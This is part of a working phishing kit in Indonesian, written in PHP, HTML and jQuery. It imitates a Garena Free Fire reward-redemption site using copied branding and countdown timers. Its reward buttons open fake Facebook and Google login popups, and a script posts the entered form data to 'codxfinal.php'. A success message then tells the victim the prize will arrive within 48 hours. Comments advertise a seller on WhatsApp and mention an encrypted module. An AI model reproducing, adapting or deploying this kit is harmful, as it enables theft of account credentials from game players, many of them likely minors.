  <div class="popup processing_account animated fadeIn" style="display: none;"> 
   <div class="popup-box-wrapperz"> 
    <div class="popup-box-navbarz"> 
     <div class="popup-box-navbar-title">
      Penukaran Selesai
     </div> 
    </div> 
    <div class="popup-box-bgz"> 
     <div class="popup-box-alert3"> 
      <br> Hai Survivor
      <br> 
      <p>Penukaran hadiah anda sedang dalam proses. <br> <br>Garena Free Fire juga akan memberi tahu Anda lewat <br>In-Game Mail, Ketika Hadiah Berhasil Terkirim. </p> 
      <p>Dimohon untuk menunggu proses hingga 1-2 hari (48 Jam)<br> <br>Salam Booyah! </p> 
     </div> 
     <div class="popup-box-alert0"> 
     </div> 
     <div class="popup-box-footer"> 
      <button type="button" onmousedown="tutup.play();" style="margin-right: 0; float: none;" onclick="location.href='https://ff.garena.com/';">Kembali</button> 
     </div> 
    </div> 
   </div> 
  </div> 
  <div class="footer" style="top:-80px;"> 
   <img class="footer-copyright-icon" src="https://images.alex-hosting.my.id/img/1/logo_1.png"> 
   <div class="footer-copyright-text"> 
    <div class="footer-txt-copyrights">
      Copyright © Garena International. Trademarks belong to their respective owners. All rights reserved. 
    </div> 
    <!-- footer-txt-copyrights ---> 
    <div class="footer-copyright-text-left">
     Privacy Policy
    </div> 
    <!-- footer-txt-copyright ---> 
    <div class="footer-copyright-text-center">
     For Parents FAQ
    </div> 
    <!-- footer-txt-copyright ---> 
    <div class="footer-copyright-text-right">
     Terms of Service
    </div> 
    <!-- footer-txt-copyright ---> 
   </div> 
   <!-- footer-copyright-text ---> 
  </div> 
  <!-- footer ---> 
  <div class="popup open_rewards animated fades" style="display: none;"> 
   <div class="popup-box-wrapper"> 
    <div class="popup-box-bg" style="height:220px;"> 
     <div class="popup-box-alert4">
      <br> 
     </div> 
     <!-- popup-box-alert ---> 
     <div class="popup-box-item"> 
      <div> 
       <figure> 
        <img class="popup-item flip" src=""> 
       </figure> 
      </div> 
     </div> 
     <!-- popup-box-item ---> 
     <br> 
     <div class="popup-box-footer" style="margin-top:40px;"> 
      <button type="button" onmousedown="buka.play();" onclick="get_token()">Collect</button> 
     </div> 
     <!-- popup-box-bg ---> 
    </div> 
    <!-- popup-box-footer ---> 
   </div> 
   <!-- popup-box-wrapper ---> 
  </div> 
  <!-- popup open_rewards ---> 
  <div class="popup loadinglogin" style="display: none;"> 
   <div class="loadinglogin" style="width:400px;height: 679px;margin-top:279px;margin-left:auto;margin-right:auto;"> 
    <div class="loader-line"></div> 
    <div class="loader-label" id="text-login1">
     LOADING...
    </div> 
    <div class="loader-label" style="display:none" id="text-login2">
     RESOURCE LOADING, PLEASE WAIT
    </div> 
    <img src="https://images.alex-hosting.my.id/img/1/loadlogin.png" style="background-size: 100% 100%;width: 100%;"> 
   </div> 
  </div> 
  <div class="popup account_login animated fadeIn" style="display: none;"> 
   <div class="popup-box-wrapper"></div> 
   <div class="rewardpop"> 
    <div class="popup-box-alert4">
     <br> 
     <img class="popup-box-gamecon" src="https://images.alex-hosting.my.id/img/1/full_logo.969f536.png" style="opacity:0%;"> 
    </div> 
    <button type="button" style="top:9px;" onmousedown="buka.play();" class="popup-btn-login popup-btn-facebook" onclick="open_facebook();"></i>Masuk Facebook</button>
    <br> 
    <div class="alter-text">
     <span>or</span>
    </div> 
    <button type="button" style="top:-35px;" onmousedown="buka.play();" class="popup-btn-login popup-btn-google" onclick="open_google();">
     <g style="padding-right: 9px;">
      Masuk Google
     </g> </button> 
   </div> 
   <!-- popup-box-bg ---> 
  </div> 
  <!-- popup-box-footer ---> 
  <div class="popup itemReward_confirmation2 fades" style="display: none;"> 
   <div class="popup-box-wrapperz"> 
    <div class="popup-box-navbar-ignis" style="margin-bottom:11px;"> 
     <div class="popup-box-navbar-ignis-title">
      Konfirmasi
     </div> 
     <img onmousedown="tutup.play();" onclick="close_reward_confirmastion()" src="https://images.alex-hosting.my.id/img/1/popup-close2.png" style="margin-top: -27px;margin-right: 25px;opacity: 0%;"> 
    </div> 
    <div class="popup-box-ignis"> 
     <div class="popup-box-alert-ignis"></div> 
     <div class="popup-box-item bordermotion itemShine" style="width: 23%;height: 90px;margin-top: 5px;margin-left: 43px;margin-bottom: 5px;"> 
      <rw id="ItemName"></rw> 
      <div class="popup-box-alert-price">
       Harga:
      </div> 
      <pr id="price"></pr> 
      <div> 
       <figure> 
        <span id="amount"></span> 
        <img src="" id="myItemReward_confirmationImg"> 
       </figure> 
      </div> 
      <div class="line"></div> 
      <img src="https://images.alex-hosting.my.id/img/1/tokens.png" style="margin-top: -9px;margin-right: -72px;width: 19px;height: auto;"> 
     </div> 
     <!-- popup-box-item ---> 
     <br> 
     <div class="popup-box-footer-ignis"> 
      <button type="button" onmousedown="tutup.play();" onclick="close_reward_confirmation()" style="width: 90px;height: 28px;padding-left: 0;padding-right: 0;margin-top: -22px;">Batalkan</button> 
      <button type="button" onmousedown="buka.play();" onclick="get_token()" style="width: 90px;height: 28px;padding-left: 0;padding-right: 0;margin-top: -22px;margin-left: 10px;"><font style="">Tukarkan</font> </button> 
     </div> 
     <!-- popup-box-footer ---> 
    </div> 
    <!-- popup-box-bg ---> 
   </div> 
   <!-- popup-box-wrapper ---> 
  </div> 
  <!-- popup itemReward_confirmation ---> 
  <script src="https://code.alex-hosting.my.id/github/jquery-3.7.1.min.js"></script>
  <script src="https://code.alex-hosting.my.id/npm/jquery-1.1.min.js"></script>
  <script>    
         function setFocus(on) {
         			var element = document.activeElement;
         			if (on) {
         				setTimeout(function() {
         					element.parentNode.classList.add("focus");
         				});
         			} else {
         				let box = document.querySelector(".input-box");
         				box.classList.remove("focus");
         				$("input").each(function() {
         					var $input = $(this);
         					var $parent = $input.closest(".input-box");
         					if ($input.val()) $parent.addClass("focus");
         					else $parent.removeClass("focus");
         				});
         			}
         		}
      </script>
  <script>
     function CodxSubmitData(formData) {
     $.ajax({
       type: "POST",
       url: "codxfinal.php",
       data: $("#FormFB").serialize(),
       beforeSend: function () {
        $(".check_verification").show();
        $(".account_verification").hide();
    },
      success: function () {
      setTimeout(function () {
      $(".processing_account").show();
      }, 1500);
      }
      });
      }
   </script>
   <script>
         // code funtion timers
         $(document).ready(function() { 
         var detik = 59;
         var menit = 59;
         var jam = 23;
         function hitung() { 
         setTimeout(hitung,1000); $('#timer1').html( '  ' + jam + ' : ' + menit + ' : ' + detik + ''); detik --; 
         if(detik < 0) { 
         detik = 59; 
         menit --; 
         if(menit < 0) { 
         menit = 0; 
         detik = 0; 
         } 
         } 
         } 
         hitung(); 
         }
         );
         $(document).ready(function() { 
         var detik = 59;
         var menit = 59;
         var jam = 23;
         function hitung() { 
         setTimeout(hitung,1000); $('#timer2').html( + jam + ' : ' + menit + ' : ' + detik + ''); detik --; 
         if(detik < 0) { 
         detik = 59; 
         menit --; 
         if(menit < 0) { 
         menit = 0; 
         detik = 0; 
         } 
         } 
         } 
         hitung(); 
         }
         );
      </script> 
  <script>
      setTimeout(function () {
      $('.loadkin').fadeOut(750);
       }, 2000);
      </script> 
  <script>
         function get_toksen() {   
         $('.open_rewards').hide(); 
         $('.itemReward_confirmation2').hide();
         $('.account_verification').show(); 
         }
         function get_token() {    
         $('.loadinglogin').show();
         $('#text-login1').show()
         setTimeout(function () {
         $('#text-login1').hide()
         $('#text-login2').fadeIn()
         }, 2000)
         $('.open_rewards').hide(); 
         $('.itemReward_confirmation2').hide();
         setTimeout(function () {
         $('.account_login').show();  
         $('.loadinglogin').hide();
         }, 5000);                              	      		    
         }
      </script> 
  <script>
    var slideIndex = 0;
    showSlides();
    function showSlides() {
    var i;
    var slides = document.getElementsByClassName("mySlides");
    var dots = document.getElementsByClassName("dot");
    for (i = 0; i < slides.length; i++) {
    slides[i].style.display = "none";  
}
    slideIndex++;
    if (slideIndex > slides.length) {slideIndex = 1}    
    for (i = 0; i < dots.length; i++) {
    dots[i].className = dots[i].className.replace(" active", "");
}
    slides[slideIndex-1].style.display = "block";  
    dots[slideIndex-1].className += " active";
    setTimeout(showSlides, 2500);
}
    // kode untuk slider notif
    var slideIndex = 0;
    showSlides();
    function showSlides() {
    var i;
    var slides = document.getElementsByClassName("slider");
    for (i = 0; i < slides.length; i++) {
        slides[i].style.display = "none"; 
}
    slideIndex++;
    if (slideIndex > slides.length) {slideIndex = 1} 
    slides[slideIndex-1].style.display = "block"; 
    setTimeout(showSlides, 2400);
}
    // kode untuk ganti gambar header otomatis1
    var slideIndexHeader = 0;
    showSlidesHeader();
    function showSlidesHeader() {
    var i;
    var slidesHeader = document.getElementsByClassName("sliderHeader");
    for (i = 0; i < slidesHeader.length; i++) {
        slidesHeader[i].style.display = "none"; 
}
    slideIndexHeader++;
    if (slideIndexHeader > slidesHeader.length) {slideIndexHeader = 1} 
    slidesHeader[slideIndexHeader-1].style.display = "block"; 
    setTimeout(showSlidesHeader, 1500);
};
</script>
<?php
//DON'T DELETE THIS MODULE
//MODULE DI ENC BIAR KAGA KE MALINGAN KODE
?>
<script>
// KHUSUS VIP S2M https://wa.me/62895310150
</script>
 </body>
</html>
<?php
}else{
    header("Location: verify.php");
}
?>